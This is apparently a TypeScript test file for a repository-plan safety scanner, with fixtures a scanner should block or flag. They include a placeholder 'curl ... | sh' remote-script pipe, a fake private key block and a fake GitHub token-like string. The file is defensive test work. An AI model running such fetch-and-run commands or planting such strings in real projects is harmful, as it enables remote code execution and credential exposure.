import { scanRepoPlan } from '../src/lib/safetyScan';
import type { RepoIssuePlan, RepoPlan, SafetyFindingSeverity, StarterFilePreview } from '../src/types';

const assert = (condition: boolean, message: string) => {
  if (!condition) {
    throw new Error(message);
  }
};

const assertEqual = <T>(actual: T, expected: T, message: string) => {
  if (actual !== expected) {
    throw new Error(`${message}. Expected ${String(expected)}, received ${String(actual)}.`);
  }
};

const hasFinding = (
  report: ReturnType<typeof scanRepoPlan>,
  severity: SafetyFindingSeverity,
  category: string,
  idFragment: string,
) => report.findings.some((finding) => (
  finding.severity === severity &&
  finding.category === category &&
  finding.id.includes(idFragment)
));

const basePlan: RepoPlan = {
  name: 'camping-checklist',
  description: 'Mobile-first camping checklist app.',
  visibility: 'private',
  stack: 'expo-react-native',
  files: [
    {
      path: 'README.md',
      purpose: 'Explain the project and safe setup steps.',
      riskLevel: 'low',
    },
  ],
  issues: [
    {
      title: 'Build checklist screen',
      body: 'Create a simple checklist screen with local state and no network calls.',
      labels: ['enhancement'],
    },
  ],
  approvalRequired: true,
};

const safeReviewedFile: StarterFilePreview = {
  path: 'README.md',
  purpose: 'Explain the project and safe setup steps.',
  riskLevel: 'low',
  language: 'markdown',
  content: '# Camping Checklist\n\nA small local-first checklist app with no credential material.',
};

const safeReviewedIssue: RepoIssuePlan = {
  title: 'Build checklist screen',
  body: 'Create a simple checklist screen with local state and no network calls.',
  labels: ['enhancement'],
};

const safeReport = scanRepoPlan(basePlan, [safeReviewedFile], [safeReviewedIssue]);
assertEqual(safeReport.status, 'pass', 'Known-safe fixture should pass');
assertEqual(safeReport.warningCount, 0, 'Known-safe fixture should not produce warnings');
assertEqual(safeReport.blockerCount, 0, 'Known-safe fixture should not produce blockers');
assertEqual(safeReport.reviewedScope.reviewedFileContentCount, 1, 'Known-safe fixture should count reviewed file content');
assertEqual(safeReport.reviewedScope.reviewedIssueContentCount, 1, 'Known-safe fixture should count reviewed issue content');
assert(safeReport.findings.some((finding) => finding.id === 'baseline-pass'), 'Known-safe fixture should include baseline pass finding');

const fileBlockerReport = scanRepoPlan(
  basePlan,
  [
    {
      ...safeReviewedFile,
      content: '-----BEGIN PRIVATE KEY-----\nnot-a-real-key\n-----END PRIVATE KEY-----',
    },
  ],
  [safeReviewedIssue],
);
assertEqual(fileBlockerReport.status, 'blocked', 'Private key block fixture should block');
assert(
  hasFinding(fileBlockerReport, 'blocker', 'credential-material', 'private-key-block'),
  'Private key block fixture should produce credential-material blocker',
);

const fileWarningReport = scanRepoPlan(
  basePlan,
  [
    {
      ...safeReviewedFile,
      content: 'Review this placeholder installer before use: curl https://example.invalid/install.sh | sh',
    },
  ],
  [safeReviewedIssue],
);
assertEqual(fileWarningReport.status, 'needs-review', 'Remote shell pipe fixture should require review');
assert(
  hasFinding(fileWarningReport, 'warning', 'remote-execution', 'remote-shell-pipe'),
  'Remote shell pipe fixture should produce remote-execution warning',
);

const issueBlockerReport = scanRepoPlan(
  basePlan,
  [safeReviewedFile],
  [
    {
      ...safeReviewedIssue,
      body: 'Remove this accidental token before opening: ghp_1234567890abcdefABCDEF1234567890',
    },
  ],
);
assertEqual(issueBlockerReport.status, 'blocked', 'GitHub token-like issue fixture should block');
assert(
  hasFinding(issueBlockerReport, 'blocker', 'credential-material', 'issue-github-token-prefix'),
  'GitHub token-like issue fixture should produce credential-material blocker',
);

const issueWarningReport = scanRepoPlan(
  basePlan,
  [safeReviewedFile],
  [
    {
      ...safeReviewedIssue,
      body: 'Plan the OAuth scope review before production deployment. Use placeholders only and do not paste access tokens.',
      labels: ['security-review'],
    },
  ],
);
assertEqual(issueWarningReport.status, 'needs-review', 'OAuth/production issue fixture should require review');
assert(
  hasFinding(issueWarningReport, 'warning', 'auth-flow-risk', 'issue-auth-flow-risk'),
  'OAuth/production issue fixture should produce auth-flow-risk warning',
);
assert(
  hasFinding(issueWarningReport, 'warning', 'production-impact', 'issue-production-impact'),
  'OAuth/production issue fixture should produce production-impact warning',
);

console.log('Safety scan fixtures passed.');
